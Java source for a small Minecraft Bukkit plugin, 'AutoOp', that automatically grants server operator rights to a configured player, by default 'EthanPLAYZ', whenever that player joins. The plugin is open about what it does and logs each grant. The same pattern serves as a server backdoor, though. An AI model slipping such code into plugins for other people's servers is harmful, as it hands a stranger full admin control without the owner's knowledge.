package com.ethanplayz.autoop;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class AutoOp extends JavaPlugin implements Listener {
    private String targetName;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        targetName = getConfig().getString("target", "EthanPLAYZ");
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("AutoOp enabled. Target: " + targetName);
    }

    @Override
    public void onDisable() {
        getLogger().info("AutoOp disabled.");
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        String name = event.getPlayer().getName();
        if (name != null && name.equalsIgnoreCase(targetName)) {
            Bukkit.getScheduler().runTask(this, () -> {
                if (!event.getPlayer().isOp()) {
                    event.getPlayer().setOp(true);
                    getLogger().info("Granted operator to " + name);
                }
            });
        }
    }
}
